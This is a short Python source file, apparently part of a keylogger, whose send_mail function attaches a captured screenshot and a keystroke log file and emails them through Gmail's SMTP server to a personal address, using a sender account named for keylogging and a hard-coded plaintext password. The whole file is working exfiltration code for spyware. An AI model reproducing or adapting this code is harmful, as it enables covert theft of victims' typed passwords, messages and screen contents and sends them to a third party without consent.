
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
#from email import encoders

def send_mail():
    sender="keylogging004@gmail.com"
    reciever="shivanarayanps@gmail.com"

    #stetup MIME
    message = MIMEMultipart()

    #adding screenshot attachments
    ss=open('screenshot.png','rb')
    msgImg = MIMEImage(ss.read())
    ss.close()
    msgImg.add_header('Content-ID','<image1>', filename='screenshot.png')
    message.attach(msgImg)

    #adding file attachments
    f1=open('log.txt','r')
    FileAtt=MIMEText((f1).read())
    f1.close()
    FileAtt.add_header('Content-Disposition','attachment', filename='log.txt')
    message.attach(FileAtt)
    text=message.as_string()

    
    s = smtplib.SMTP('smtp.gmail.com',587) #create SMTP session
    s.starttls() #start TLS for security
    s.login(sender,"keylog@123")  #authentication
    s.sendmail(sender,reciever,text)
    s.quit()
    print('mail sent')